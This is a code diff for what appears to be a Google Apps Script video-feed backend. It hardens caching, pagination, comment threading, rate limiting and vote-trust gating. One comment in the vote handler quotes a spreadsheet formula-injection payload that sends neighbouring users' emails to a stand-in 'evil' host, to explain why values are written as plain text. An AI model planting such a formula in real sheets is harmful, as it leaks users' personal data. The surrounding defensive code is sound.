- * invalidate the feed head: crawl completions add rows to the window, and
+ * Invalidates the cached Top-This-Week payload. Called from the same writers
+ * that invalidate the feed head: crawl completions add rows to the window AND
+ * refresh view counts (which feed the score via topWeekScore), and
  * vote/comment recounts change counts baked into the cached rows (votes also
- * reorder the ranking). Cheap enough to call unconditionally.
+ * reorder the ranking). Bumps the generation (which alone defeats a late
+ * populate stamped with the pre-bump value) and drops the key.
  */
 function invalidateTopWeek() {
+  bumpCacheGeneration();
   try {
-    CacheService.getScriptCache().remove(TOP_WEEK_CACHE_KEY);
+    var cache = CacheService.getScriptCache();
+    cache.remove(TOP_WEEK_CACHE_KEY);
+    // The ranking is derived from the whole-catalog snapshot, and every writer
+    // that re-ranks (crawl view refresh, vote/comment recount) also changed
+    // rows baked into that snapshot — drop it too, not just the ranked slice.
+    cache.remove(CATALOG_CACHE_KEY);
   } catch (e) {
-    /* best-effort */
+    /* best-effort — the generation bump already invalidated it */
   }
 }
 
 /**
- * Total order for Top This Week: vote_count descending, then published_at
- * descending, then video_id descending as a deterministic tiebreak. The
- * tiebreak matters for cursor pagination — without it two items with equal
- * votes and equal timestamps could swap between requests, letting a cursor
- * skip or repeat them (the same reason compareVideos carries an id tiebreak).
+ * Top-This-Week ranking score: upvotes plus one synthetic vote per
+ * TOP_WEEK_VIEWS_PER_VOTE views. Derived from the stored counts at sort time
+ * — a crawl that refreshes view_count changes the score on the next ranking
+ * read without any recompute-and-save step.
+ */
+function topWeekScore(v) {
+  return (Number(v.vote_count) || 0) +
+    Math.floor((Number(v.view_count) || 0) / TOP_WEEK_VIEWS_PER_VOTE);
+}
+
+/**
+ * Total order for Top This Week: score descending (upvotes + view weight, see
+ * topWeekScore), then published_at descending, then video_id descending as a
+ * deterministic tiebreak. The tiebreak matters for cursor pagination — without
+ * it two items with equal scores and equal timestamps could swap between
+ * requests, letting a cursor skip or repeat them (the same reason
+ * compareVideos carries an id tiebreak).
  */
 function compareTopWeek(a, b) {
-  var av = Number(a.vote_count) || 0;
-  var bv = Number(b.vote_count) || 0;
+  var av = topWeekScore(a);
+  var bv = topWeekScore(b);
   if (bv !== av) return bv - av;
   var diff = pubTime(b) - pubTime(a);
   if (diff !== 0) return diff;
@@ -2479,44 +3730,45 @@ function compareTopWeek(a, b) {
 
 /** Opaque cursor for the position AFTER this video in the top-week order. */
 function topCursorFor(video) {
-  return (Number(video.vote_count) || 0) + '|' +
+  return topWeekScore(video) + '|' +
     new Date(pubTime(video)).toISOString() + '|' + video.video_id;
 }
 
-/** Parses a top-week cursor "votes|iso|id" into its parts, or null if malformed. */
+/** Parses a top-week cursor "score|iso|id" into its parts, or null if malformed. */
 function parseTopCursor(cursor) {
   var i1 = cursor.indexOf('|');
   if (i1 === -1) return null;
   var i2 = cursor.indexOf('|', i1 + 1);
   if (i2 === -1) return null;
-  var votes = Number(cursor.slice(0, i1));
+  var score = Number(cursor.slice(0, i1));
   var time = new Date(cursor.slice(i1 + 1, i2)).getTime();
-  if (isNaN(votes) || isNaN(time)) return null;
+  if (isNaN(score) || isNaN(time)) return null;
   // video_id is the remainder — it never itself contains '|' (YouTube ids and
   // web-safe base64 article ids are alphanumeric), so this slice is exact.
-  return { votes: votes, time: time, id: String(cursor.slice(i2 + 1)) };
+  return { score: score, time: time, id: String(cursor.slice(i2 + 1)) };
 }
 
 /** True if `video` sorts strictly AFTER cursor position `c` in top-week order. */
 function topAfterCursor(video, c) {
-  var vv = Number(video.vote_count) || 0;
-  if (vv !== c.votes) return vv < c.votes;
+  var vv = topWeekScore(video);
+  if (vv !== c.score) return vv < c.score;
   var vt = pubTime(video);
   if (vt !== c.time) return vt < c.time;
   return String(video.video_id || '') < c.id;
 }
 
 /**
- * Returns videos published in the last 7 days, ranked by upvotes (most-voted
- * first, newest then video_id as tiebreaks). When votes are sparse this
- * gracefully degrades to the week's videos in reverse-chron order, so the tab
- * is never empty.
+ * Returns videos published in the last 7 days, ranked by score — upvotes plus
+ * one synthetic vote per TOP_WEEK_VIEWS_PER_VOTE views (topWeekScore) —
+ * highest first, newest then video_id as tiebreaks. When votes and views are
+ * sparse this gracefully degrades to the week's videos in reverse-chron
+ * order, so the tab is never empty.
  *
  * Cursor-paginated exactly like getVideos: early no-cursor pages are served
  * from the cached ranked head; deeper pages resume strictly after the
- * (vote_count, published_at, video_id) position the client last saw. So the
+ * (score, published_at, video_id) position the client last saw. So the
  * WHOLE week is reachable by scrolling even though the cache only holds the
- * head — with sparse votes the order is reverse-chron, so paging simply walks
+ * head — with sparse scores the order is reverse-chron, so paging simply walks
  * back through the week instead of stopping at the newest cap.
  */
 function handleTopWeek(params) {
@@ -2526,8 +3778,11 @@ function handleTopWeek(params) {
   // channel plus retry backoff) made the request slow enough to time out, and
   // unlike the feed the top-week tab has no cached fallback, so a slow crawl
   // surfaced to the user as an outright failure.
-  var limit = parseInt(params.limit) || 50;
-  var page = parseInt(params.page) || 1;
+  // Clamp both, like getVideos: `?page=-1` otherwise yields slice(-100,-50) (a
+  // window from the END of the list) and `&limit=100000` serializes the whole
+  // catalog on a cache miss (BE11).
+  var limit = Math.min(Math.max(1, parseInt(params.limit) || 50), MAX_PAGE_LIMIT);
+  var page = Math.max(1, parseInt(params.page) || 1);
   var cursor = params.cursor || '';
   var start = (page - 1) * limit;
 
@@ -2555,25 +3810,27 @@ function handleTopWeek(params) {
 
   var cutoff = Date.now() - 7 * 24 * 60 * 60 * 1000;
 
-  var recent = readAllVideos().filter(function(v) {
+  // Capture the generation BEFORE the sheet read so a vote/comment/crawl that
+  // invalidates mid-scan advances it past this value; putCachedSortedList then
+  // refuses to install this now-stale window for the full TTL (the BE2 race).
+  var catalog = readSortedCatalog();
+  var gen = catalog.gen;
+  var recent = catalog.videos.filter(function(v) {
     var t = new Date(v.published_at).getTime();
     return !isNaN(t) && t >= cutoff;
   });
 
   recent.sort(compareTopWeek);
 
-  // Read-through populate for the next caller. Best-effort — an oversized value
-  // or cache hiccup just means the next request scans the sheet again.
-  try {
-    CacheService.getScriptCache().put(TOP_WEEK_CACHE_KEY, JSON.stringify({
-      videos: recent.slice(0, TOP_WEEK_CACHE_COUNT),
-      total: recent.length,
-    }), TOP_WEEK_CACHE_SECONDS);
-  } catch (e) {
-    /* cache write is optional */
-  }
+  // Read-through populate for the next caller, stamped with the generation
+  // captured above so a snapshot read before a concurrent invalidate can't be
+  // re-installed. Best-effort.
+  putCachedSortedList(TOP_WEEK_CACHE_KEY, TOP_WEEK_CACHE_SECONDS, {
+    videos: recent.slice(0, TOP_WEEK_CACHE_COUNT),
+    total: recent.length,
+  }, gen);
 
-  // Cursor pagination: resume strictly after the (vote_count, published_at,
+  // Cursor pagination: resume strictly after the (score, published_at,
   // video_id) position the client last saw. Unlike a page offset, a vote that
   // reorders the window mid-scroll can't make forward paging skip a whole page
   // — at worst it nudges one item across the boundary, which the client dedupes.
@@ -2684,7 +3941,12 @@ function handleCommentsBatch(params) {
     return { status: 'error', message: 'videoIds is required' };
   }
 
-  var byVideo = {};
+  // Null-prototype map: a comment row whose video_id is 'constructor',
+  // 'toString', or 'valueOf' would otherwise be truthy on a plain {} (it
+  // resolves to an inherited Object.prototype member), pass the `if
+  // (!byVideo[vid])` gate below, and throw on `.push` — crashing comment-count
+  // hydration for the whole feed until the row is deleted.
+  var byVideo = Object.create(null);
   ids.forEach(function(id) { byVideo[id] = []; });
 
   var sheet = getSheet('COMMENTS');
@@ -2712,6 +3974,33 @@ function handleCommentsBatch(params) {
   return { status: 'ok', byVideo: byVideo };
 }
 
+/**
+ * True if a comment with `commentId` exists on `videoId`. Used to validate a
+ * reply's parent before threading it: a parentId that doesn't resolve to a
+ * comment on the same video is treated as top-level so buildCommentTree can't
+ * promote an orphan reply onto the target video. String-compares to survive
+ * Sheets type coercion, matching the vote/star scans.
+ * @param {string} commentId
+ * @param {string} videoId
+ * @returns {boolean}
+ */
+function commentExistsOnVideo(commentId, videoId) {
+  var sheet = getSheet('COMMENTS');
+  var data = sheet.getDataRange().getValues();
+  if (data.length <= 1) return false;
+  var headers = data[0];
+  var idCol = headers.indexOf('comment_id');
+  var videoIdCol = findVideoIdCol(headers);
+  if (idCol === -1 || videoIdCol === -1) return false;
+  for (var i = 1; i < data.length; i++) {
+    if (String(data[i][idCol]) === String(commentId) &&
+        String(data[i][videoIdCol]) === String(videoId)) {
+      return true;
+    }
+  }
+  return false;
+}
+
 function handleAddComment(data) {
   var videoId = data.videoId;
   var parentId = data.parentId;
@@ -2721,6 +4010,12 @@ function handleAddComment(data) {
   // 1. Validate required fields
   if (!videoId || !body || !token) {
     return { status: 'error', message: 'videoId, body, and token are required' };
+  }
+
+  // 1b. Validate videoId shape before trusting it in a write (blocks junk-row
+  // flooding and formula-shaped ids from reaching the sheet).
+  if (!isValidId(videoId)) {
+    return { status: 'error', message: 'Invalid videoId' };
   }
 
   // 2. Validate comment length (max 2000 characters)
@@ -2741,10 +4036,17 @@ function handleAddComment(data) {
     return { status: 'error', message: 'You have been blocked from commenting' };
   }
 
-  // 5. Determine depth
+  // 5. Determine depth. A reply's parent must already exist ON THIS VIDEO;
+  // otherwise buildCommentTree would promote an orphan/foreign parentId onto the
+  // target video. An unresolvable parentId is demoted to a top-level comment
+  // (parent_id cleared below via `parentId || ''`, depth stays 0).
   var depth = 0;
   if (parentId) {
-    depth = 1;
+    if (commentExistsOnVideo(parentId, videoId)) {
+      depth = 1;
+    } else {
+      parentId = '';
+    }
   }
 
   // 6. Generate comment ID
@@ -2766,8 +4068,12 @@ function handleAddComment(data) {
   }
 
   try {
-    // 7. Check rate limit (see lock comment above)
-    if (isRateLimited(user.email)) {
+    // 7. Check rate limit (see lock comment above). CacheService-backed
+    // check-and-set: stamps the commenter for RATE_LIMIT_SECONDS and blocks a
+    // repeat inside that window. Kept inside the lock so two simultaneous posts
+    // can't both slip through. No PII lands in the Meta sheet, and the stamp
+    // self-expires (no unbounded rate_ row growth).
+    if (isActionRateLimited('comment', user.email, RATE_LIMIT_SECONDS)) {
       log('WARN', 'addComment', 'Rate limited: ' + user.email);
       return { status: 'error', message: 'Please wait before posting another comment' };
     }
@@ -2795,10 +4101,8 @@ function handleAddComment(data) {
       now,
     ]]);
 
-    // 9. Record for rate limiting
-    recordCommentTime(user.email);
-
-    // 10. Update comment count on the video
+    // 9. Update comment count on the video (the rate-limit stamp was set by the
+    // check-and-set in step 7).
     updateCommentCount(videoId);
   } finally {
     lock.releaseLock();
@@ -2881,18 +4185,230 @@ function updateCommentCount(videoId) {
 // ============================================================
 
 /**
- * Gets (or creates) the "Votes" tab inside the Comments spreadsheet.
- * Storing it as a named tab avoids provisioning a separate spreadsheet.
+ * Gets (or creates) a per-user activity tab ('Votes' | 'Stars' | 'Bookmarks')
+ * in the CUSTOMERS spreadsheet — the single user-data store. These tabs lived
+ * in the Comments spreadsheet before Backend 1.21.0 (a shortcut to avoid
+ * provisioning a spreadsheet, from before CUSTOMERS existed); the first access
+ * after the move creates the tab and copies the legacy tab's rows across.
+ *
+ * The create-and-migrate step is all-or-nothing: it runs under the script
+ * lock (two concurrent first requests can't both create the tab), and on any
+ * failure the half-made tab is deleted before rethrowing, so the next access
+ * retries the whole step instead of trusting an empty tab as migrated.
+ * Migration copies by id (column 1), so a retry never duplicates rows, and
+ * the legacy tab is left untouched for post-verification cleanup.
+ *
+ * @param {string} name - tab name, also the legacy Comments-spreadsheet tab name
+ * @param {string[]} headers - header row for a freshly created tab
+ * @returns {Sheet}
+ */
+function getUserDataTab(name, headers) {
+  var ss = getCustomersSpreadsheet();
+  var sheet = ss.getSheetByName(name);
+  if (sheet) return sheet;
+
+  var lock = LockService.getScriptLock();
+  lock.waitLock(10000);
+  try {
+    sheet = ss.getSheetByName(name); // re-check under the lock
+    if (sheet) return sheet;
+    try {
+      sheet = ss.insertSheet(name);
+      sheet.appendRow(headers);
+      var copied = migrateLegacyUserTab(name, sheet, headers);
+      if (copied > 0) {
+        log('INFO', 'getUserDataTab', name + ': migrated ' + copied + ' row(s) from the Comments spreadsheet');
+      }
+      return sheet;
+    } catch (e) {
+      if (sheet) {
+        try { ss.deleteSheet(sheet); } catch (e2) { /* next access still retries */ }
+      }
+      throw e;
+    }
+  } finally {
+    lock.releaseLock();
+  }
+}
+
+/**
+ * Copies every row of the legacy Comments-spreadsheet tab of this name into
+ * `target`, skipping ids (column 1) already present, and returns the count.
+ * Throws on failure — the caller undoes the tab creation so the migration is
+ * retried rather than silently skipped.
+ */
+function migrateLegacyUserTab(name, target, headers) {
+  var legacy = SpreadsheetApp.openById(SPREADSHEET_IDS.COMMENTS).getSheetByName(name);
+  if (!legacy) return 0; // fresh install — nothing to migrate
+  var rows = legacy.getDataRange().getValues();
+  if (rows.length <= 1) return 0;
+
+  var existing = {};
+  var current = target.getDataRange().getValues();
+  for (var i = 1; i < current.length; i++) existing[String(current[i][0])] = true;
+
+  var toCopy = [];
+  for (var r = 1; r < rows.length; r++) {
+    var id = rows[r][0];
+    if (id === '' || id === null || id === undefined || existing[String(id)]) continue;
+    var row = rows[r].slice(0, headers.length);
+    while (row.length < headers.length) row.push('');
+    toCopy.push(row);
+  }
+  if (toCopy.length) {
+    var range = target.getRange(target.getLastRow() + 1, 1, toCopy.length, headers.length);
+    range.setNumberFormat('@'); // plain text, like the tabs' own writes
+    range.setValues(toCopy);
+  }
+  return toCopy.length;
+}
+
+/**
+ * Gets (or creates) the "Votes" tab of the CUSTOMERS spreadsheet.
  * @returns {Sheet}
  */
 function getVotesSheet() {
-  var ss = SpreadsheetApp.openById(SPREADSHEET_IDS.COMMENTS);
-  var sheet = ss.getSheetByName('Votes');
-  if (!sheet) {
-    sheet = ss.insertSheet('Votes');
-    sheet.appendRow(['vote_id', 'video_id', 'user_email', 'created_at']);
+  // Fresh installs get the vote-trust `counted` column in the header from the
+  // start. An existing 4-column tab has it added lazily by handleVote (from the
+  // header row it already reads — no extra scan here on the hot path); readers
+  // treat a missing/blank `counted` as counted=true, so nothing breaks before
+  // the column exists.
+  return getUserDataTab('Votes', ['vote_id', 'video_id', 'user_email', 'created_at', 'counted']);
+}
+
+/** True while the operator has turned vote-trust ENFORCEMENT on in Meta. */
+function isVoteTrustEnabled() {
+  return String(getMeta(VOTE_TRUST_ENABLED_META_KEY)).toLowerCase() === 'true';
+}
+
+/**
+ * Whether the tenure gate actually enforces at `nowMs`: the Meta toggle must be
+ * on AND one full trust window must have elapsed since the tenure clock started
+ * (see VOTE_TRUST_CLOCK_START_ISO). Before that, every pre-existing account is
+ * "low-tenure" only because the column is new, and enforcing would gate everyone
+ * — so the toggle is inert. Takes the time as a parameter so the guard is
+ * testable at fixed instants.
+ * @param {number} nowMs
+ * @returns {boolean}
+ */
+function isVoteTrustEnforced(nowMs) {
+  if (!isVoteTrustEnabled()) return false;
+  var clockStart = Date.parse(VOTE_TRUST_CLOCK_START_ISO);
+  return nowMs >= clockStart + trustTenureMs();
+}
+
+/**
+ * Caches an account's first_seen (ISO string or epoch ms) under its email hash
+ * for FIRST_SEEN_CACHE_SECONDS. Called at bootstrap (readOrCreateCustomer) and on
+ * a vote-time lookup, so a subsequent vote resolves tenure from cache with no
+ * CUSTOMERS scan. Ignores blank/unparseable values; never throws.
+ */
+function rememberFirstSeen(email, value) {
+  var ms = (typeof value === 'number') ? value : Date.parse(value);
+  if (!isFinite(ms)) return;
+  try {
+    CacheService.getScriptCache().put('fseen_' + tokenHash(email), String(ms), FIRST_SEEN_CACHE_SECONDS);
+  } catch (e) { /* best-effort */ }
+}
+
+/** The CUSTOMERS spreadsheet, opened once per execution (see _cachedCustomersSS). */
+function getCustomersSpreadsheet() {
+  if (!_cachedCustomersSS) _cachedCustomersSS = SpreadsheetApp.openById(SPREADSHEET_IDS.CUSTOMERS);
+  return _cachedCustomersSS;
+}
+
+/** The trust window in ms — Meta `vote_trust_tenure_hours` overrides the default. */
+function trustTenureMs() {
+  var override = parseFloat(getMeta(VOTE_TRUST_TENURE_META_KEY));
+  var hours = (isFinite(override) && override >= 0) ? override : TRUST_TENURE_HOURS;
+  return hours * 60 * 60 * 1000;
+}
+
+/**
+ * The account's first_seen_at as epoch ms — the basis for its voting tenure.
+ * Cached by email hash (first_seen is immutable once set). On a cache miss it
+ * scans CUSTOMERS; a voter with no row yet (e.g. a direct API caller that never
+ * ran bootstrap) is APPENDED with first_seen=now, so skipping the sign-in flow
+ * can't dodge the gate — its clock simply starts at zero tenure.
+ *
+ * MUST be called OUTSIDE the handleVote script lock: it may take the lock itself
+ * to append a missing row, and LockService is not reentrant.
+ *
+ * Fails OPEN: if CUSTOMERS is unreachable or malformed, returns 0 (epoch) so the
+ * tenure reads as effectively infinite and the voter is treated as trusted —
+ * availability of voting beats a perfect gate, and the enable toggle is the real
+ * master switch.
+ *
+ * @param {string} email
+ * @param {string} name
+ * @returns {number} epoch ms of first sighting (0 on any failure → trusted)
+ */
+function voterFirstSeenMs(email, name) {
+  var cache = null, key = null;
+  try {
+    cache = CacheService.getScriptCache();
+    key = 'fseen_' + tokenHash(email);
+    var hit = cache.get(key);
+    if (hit) { var n = parseInt(hit, 10); if (isFinite(n)) return n; }
+  } catch (e) { cache = null; }
+
+  try {
+    var sheet = getCustomersSheet();
+    var cols = customerCols(sheet);
+    if (cols.email === -1 || cols.first_seen_at === -1) return 0; // unusable shape → trusted
+    var rows = sheet.getDataRange().getValues();
+    for (var i = 1; i < rows.length; i++) {
+      if (rows[i][cols.email] === email) {
+        var ms = Date.parse(rows[i][cols.first_seen_at]);
+        if (isNaN(ms)) return 0; // blank/unparseable → trusted (don't punish legacy rows)
+        rememberFirstSeen(email, ms);
+        return ms;
+      }
+    }
+    // No row yet: record first sighting NOW (starts the tenure clock) under the
+    // customers lock, then treat this vote as zero-tenure.
+    var nowIso = new Date().toISOString();
+    var lock = LockService.getScriptLock();
+    try { lock.waitLock(5000); } catch (e) { return Date.now(); } // busy → zero tenure now
+    try {
+      var again = sheet.getDataRange().getValues();
+      for (var j = 1; j < again.length; j++) {
+        if (again[j][cols.email] === email) {
+          var ms2 = Date.parse(again[j][cols.first_seen_at]);
+          return isNaN(ms2) ? 0 : ms2;
+        }
+      }
+      appendCustomerRow(sheet, cols, { email: email, name: name, firstSeenAt: nowIso, source: 'vote' });
+    } finally {
+      lock.releaseLock();
+    }
+    var nowMs = Date.parse(nowIso);
+    rememberFirstSeen(email, nowMs);
+    return nowMs;
+  } catch (e) {
+    log('ERROR', 'voteTrust', 'first_seen lookup failed (fail-open): ' + e.message);
+    return 0; // fail open — trusted
   }
-  return sheet;
+}
+
+/**
+ * Records one untrusted new-vote against a video's rolling velocity counter and,
+ * the first time the window crosses VOTE_ANOMALY_BURST_THRESHOLD, logs a single
+ * WARN naming the video and count. Best-effort (cache-backed); never throws into
+ * the vote path. Detection/visibility only — it does not hide or rerank anything.
+ */
+function recordVoteAnomaly(videoId) {
+  try {
+    var cache = CacheService.getScriptCache();
+    var bucket = Math.floor(Date.now() / (VOTE_ANOMALY_WINDOW_SECONDS * 1000));
+    var key = 'uvel_' + videoId + '_' + bucket;
+    var n = (parseInt(cache.get(key), 10) || 0) + 1;
+    cache.put(key, String(n), VOTE_ANOMALY_WINDOW_SECONDS + 60);
+    if (n === VOTE_ANOMALY_BURST_THRESHOLD) {
+      log('WARN', 'voteTrust', 'Possible vote manipulation on ' + videoId + ': ' +
+        n + ' low-tenure votes within ' + Math.round(VOTE_ANOMALY_WINDOW_SECONDS / 60) + 'm');
+    }
+  } catch (e) { /* best-effort telemetry */ }
 }
 
 /**
@@ -2907,6 +4423,10 @@ function handleVote(data) {
     return { status: 'error', message: 'videoId and token are required' };
   }
 
+  if (!isValidId(videoId)) {
+    return { status: 'error', message: 'Invalid videoId' };
+  }
+
   var user = authenticateUser(token);
   if (!user) {
     log('ERROR', 'vote', 'Invalid Google token');
@@ -2916,6 +4436,22 @@ function handleVote(data) {
   if (isUserBlocked(user.email)) {
     return { status: 'error', message: 'You have been blocked' };
   }
+
+  // Throttle toggles BEFORE taking the global lock: a vote is cheap but lockful,
+  // so an account looping this would serialize every other write and churn the
+  // caches. Checked pre-lock so a blocked call never even queues for the lock.
+  if (isActionRateLimited('vote', user.email, VOTE_STAR_RATE_LIMIT_SECONDS)) {
+    return { status: 'error', message: 'You are doing that too fast, please slow down' };
+  }
+
+  // Resolve voter tenure BEFORE the lock (voterFirstSeenMs may take the lock
+  // itself to record a first sighting — LockService is not reentrant). `trusted`
+  // means the account has been seen for at least the trust window; `enforce` is
+  // the Meta master switch, held inert until the tenure clock has run one full
+  // window (isVoteTrustEnforced). While not enforcing we still compute tenure
+  // (a cache hit after bootstrap) and flag anomalies, but every vote counts.
+  var enforce = isVoteTrustEnforced(Date.now());
+  var trusted = (Date.now() - voterFirstSeenMs(user.email, user.name)) >= trustTenureMs();
 
   // Serialize the read-find-mutate-recount so concurrent toggles from the
   // same user can't double-insert or delete the wrong (shifted) row.
@@ -2932,6 +4468,14 @@ function handleVote(data) {
     var headers = data2[0];
     var videoIdCol = headers.indexOf('video_id');
     var emailCol = headers.indexOf('user_email');
+    var countedCol = headers.indexOf('counted');
+    // Lazily add the `counted` header to a pre-gate 4-column tab, reusing the
+    // header row we just read (no extra scan). Existing rows keep a blank cell,
+    // which reads as counted=true. New rows below get the flag in this column.
+    if (countedCol === -1) {
+      countedCol = headers.length;
+      sheet.getRange(1, countedCol + 1).setValue('counted');
+    }
 
     // Find this user's existing vote on this video
     var existingRow = -1;
@@ -2943,16 +4487,50 @@ function handleVote(data) {
     }
 
     var voted;
+    var affectsCount; // whether this toggle should move the ranking vote_count
     if (existingRow !== -1) {
+      // Un-vote: decrement only if THIS row had been counted. A vote cast while
+      // untrusted (counted='false') and withdrawn after the account aged in must
+      // not decrement a count it never incremented. Legacy rows (blank counted,
+      // cast before the gate) read as counted=true.
+      var wasCounted = countedCol === -1 || String(data2[existingRow - 1][countedCol]) !== 'false';
       sheet.deleteRow(existingRow);
       voted = false;
+      affectsCount = wasCounted;
     } else {
+      // New vote. `counted` records whether it contributes to vote_count: always
+      // when enforcement is off (observe), only for trusted accounts when on.
+      var counted = enforce ? trusted : true;
+      // Write as plain text so Sheets can't coerce videoId/email into a live
+      // formula. The Votes tab's column C is user_email, so a videoId of
+      // '=IMPORTXML("https://evil/?d="&C2,"//a")' would otherwise execute in the
+      // owner's session on open and exfiltrate adjacent users' emails. Mirrors
+      // the reserve-then-format pair used by handleStar/handleAddComment.
       var voteId = 'v_' + Utilities.getUuid().replace(/-/g, '').substring(0, 12);
-      sheet.appendRow([voteId, videoId, user.email, new Date().toISOString()]);
+      var newRowNum = sheet.getLastRow() + 1;
+      var range = sheet.getRange(newRowNum, 1, 1, 5);
+      range.setNumberFormat('@');
+      range.setValues([[voteId, videoId, user.email, new Date().toISOString(), counted ? 'true' : 'false']]);
       voted = true;
+      affectsCount = counted;
+
+      // Anomaly signal: a low-tenure new vote. Logged and velocity-tracked in
+      // BOTH modes so the observe window shows what enforcement would catch.
+      // WARN, not INFO: log() drops anything below the Meta log_level, and the
+      // default is ERROR — so an operator observing the rollout sets log_level
+      // to WARN and sees exactly these lines (INFO would never be written).
+      if (!trusted) {
+        recordVoteAnomaly(videoId);
+        log('WARN', 'voteTrust',
+          (enforce ? 'Gated' : 'Would gate') + ' low-tenure vote on ' + videoId);
+      }
     }
 
-    var count = updateVoteCount(videoId);
+    // Move the stored count by the known row change (+1/-1) when this toggle
+    // affects it; otherwise reconcile (delta omitted) so the returned count is
+    // the authoritative trusted total — the just-written 'false' row / the
+    // just-deleted uncounted row is excluded, so the number is correct either way.
+    var count = affectsCount ? updateVoteCount(videoId, voted ? 1 : -1) : updateVoteCount(videoId);
     return { status: 'ok', voted: voted, vote_count: count };
   } finally {
     lock.releaseLock();
@@ -2993,18 +4571,39 @@ function readUserVoteIds(email) {
 }
 
 /**
- * Recounts votes for a video from the Votes sheet and writes the total
- * to the video's vote_count column, creating that column if it's missing.
+ * Updates a video's stored vote_count and returns the new total.
+ *
+ * BE5: the caller (handleVote, under the script lock) already knows whether a
+ * vote row was added or removed, so it passes `delta` (+1 / -1) and we move the
+ * count on the KNOWN row — no re-read of the (unbounded, ever-growing) Votes
+ * sheet. When `delta` is omitted we fall back to the original full recount from
+ * the Votes sheet, so a reconcile/legacy caller still gets an authoritative
+ * total. The count never goes below zero.
+ *
+ * @param {string} videoId
+ * @param {number} [delta] - +1 / -1 for the incremental path; omit to recount
  * @returns {number} The new vote count
  */
-function updateVoteCount(videoId) {
-  var votesSheet = getVotesSheet();
-  var votesData = votesSheet.getDataRange().getValues();
-  var vHeaders = votesData[0];
-  var voteVideoCol = vHeaders.indexOf('video_id');
-  var count = 0;
-  for (var i = 1; i < votesData.length; i++) {
-    if (votesData[i][voteVideoCol] === videoId) count++;
+function updateVoteCount(videoId, delta) {
+  var incremental = (typeof delta === 'number' && !isNaN(delta));
+
+  var count;
+  if (!incremental) {
+    // Reconcile path: authoritative recount from the Votes sheet. Counts only
+    // rows that CONTRIBUTE to the ranking — `counted` !== 'false'. A row cast by
+    // a low-tenure account under enforcement carries counted='false' and is
+    // excluded; legacy rows (blank counted, pre-gate) count as before.
+    var votesSheet = getVotesSheet();
+    var votesData = votesSheet.getDataRange().getValues();
+    var vHeaders = votesData[0];
+    var voteVideoCol = vHeaders.indexOf('video_id');
+    var voteCountedCol = vHeaders.indexOf('counted');
+    count = 0;
+    for (var i = 1; i < votesData.length; i++) {
+      if (votesData[i][voteVideoCol] !== videoId) continue;
+      if (voteCountedCol !== -1 && String(votesData[i][voteCountedCol]) === 'false') continue;
+      count++;
+    }
   }
 
   var videosSheet = getSheet('VIDEOS');
@@ -3022,6 +4621,10 @@ function updateVoteCount(videoId) {
   var found = false;
   for (var i = 1; i < videosData.length; i++) {
     if (videosData[i][videoIdCol] === videoId) {
+      if (incremental) {
+        var current = Number(videosData[i][voteCountCol]) || 0;
+        count = Math.max(0, current + delta);
+      }
       videosSheet.getRange(i + 1, voteCountCol + 1).setValue(count);
       found = true;
       break;
@@ -3029,7 +4632,16 @@ function updateVoteCount(videoId) {
   }
   // The live scan missed — the video may have been archived. Update the row in
   // the Archive tab so a vote on a shared-link/search result still persists.
-  if (!found) updateArchivedCount(videoId, 'vote_count', count);
+  if (!found) {
+    if (incremental) {
+      // Move the archived row's count by the same delta; if the id isn't in the
+      // archive either it's brand new, so the total is the delta off an empty base.
+      var archived = bumpArchivedVoteCount(videoId, delta);
+      count = (archived === null) ? Math.max(0, delta) : archived;
+    } else {
+      updateArchivedCount(videoId, 'vote_count', count);
+    }
+  }
 
   // vote_count is baked into the cached feed head AND drives the top-week
   // ranking — drop both so the next request serves the new count and order.
@@ -3039,23 +4651,45 @@ function updateVoteCount(videoId) {
   return count;
 }
 
+/**
+ * Incremental sibling of updateArchivedCount for the vote path: reads the
+ * archived row's current vote_count, moves it by `delta` (floored at 0), writes
+ * it back, and drops the archive cache. Returns the new count, or null when the
+ * id isn't in the Archive tab (so the caller can treat it as a fresh video).
+ * Caller already holds the script lock.
+ * @returns {number|null}
+ */
+function bumpArchivedVoteCount(videoId, delta) {
+  var ss = SpreadsheetApp.openById(SPREADSHEET_IDS.VIDEOS);
+  var archiveSheet = ss.getSheetByName(ARCHIVE_SHEET_NAME);
+  if (!archiveSheet) return null;
+  var data = archiveSheet.getDataRange().getValues();
+  if (data.length <= 1) return null;
+  var headers = data[0];
+  var videoIdCol = findVideoIdCol(headers);
+  var countCol = headers.indexOf('vote_count');
+  if (videoIdCol === -1 || countCol === -1) return null;
+  for (var i = 1; i < data.length; i++) {
+    if (data[i][videoIdCol] === videoId) {
+      var next = Math.max(0, (Number(data[i][countCol]) || 0) + delta);
+      archiveSheet.getRange(i + 1, countCol + 1).setValue(next);
+      invalidateArchive();
+      return next;
+    }
+  }
+  return null;
+}
+
 // ============================================================
 // STARS — starred creators, one per Google account per channel
 // ============================================================
 
 /**
- * Gets (or creates) the "Stars" tab inside the Comments spreadsheet,
- * following the same pattern as the Votes tab.
+ * Gets (or creates) the "Stars" tab of the CUSTOMERS spreadsheet.
  * @returns {Sheet}
  */
 function getStarsSheet() {
-  var ss = SpreadsheetApp.openById(SPREADSHEET_IDS.COMMENTS);
-  var sheet = ss.getSheetByName('Stars');
-  if (!sheet) {
-    sheet = ss.insertSheet('Stars');
-    sheet.appendRow(['star_id', 'channel_name', 'user_email', 'created_at']);
-  }
-  return sheet;
+  return getUserDataTab('Stars', ['star_id', 'channel_name', 'user_email', 'created_at']);
 }
 
 /**
@@ -3070,6 +4704,14 @@ function handleStar(data) {
     return { status: 'error', message: 'channel and token are required' };
   }
 
+  // channel is a display name (spaces, '&', ...), not an id, so cap its length
+  // rather than restrict the charset — enough to stop junk-row flooding with a
+  // giant channel string. The '@'-formatted write below defeats formula
+  // injection on the value itself.
+  if (typeof channel !== 'string' || channel.length > 200) {
+    return { status: 'error', message: 'Invalid channel' };
+  }
+
   var user = authenticateUser(token);
   if (!user) {
     log('ERROR', 'star', 'Invalid Google token');
@@ -3078,6 +4720,11 @@ function handleStar(data) {
 
   if (isUserBlocked(user.email)) {
     return { status: 'error', message: 'You have been blocked' };
+  }
+
+  // Same pre-lock throttle as handleVote: a star toggle is cheap but lockful.
+  if (isActionRateLimited('star', user.email, VOTE_STAR_RATE_LIMIT_SECONDS)) {
+    return { status: 'error', message: 'You are doing that too fast, please slow down' };
   }
 
   // Serialize read-find-mutate so concurrent toggles can't double-insert
@@ -3165,10 +4812,11 @@ function readUserStarChannels(email) {
 
 /**
  * One round trip for everything the client needs about the signed-in user on
- * load: their upvoted video ids AND starred channels. Replaces the separate
- * myVotes + myStars POSTs fired back-to-back at sign-in — each re-verified the
- * ID token over the network and, because Apps Script serializes a user's
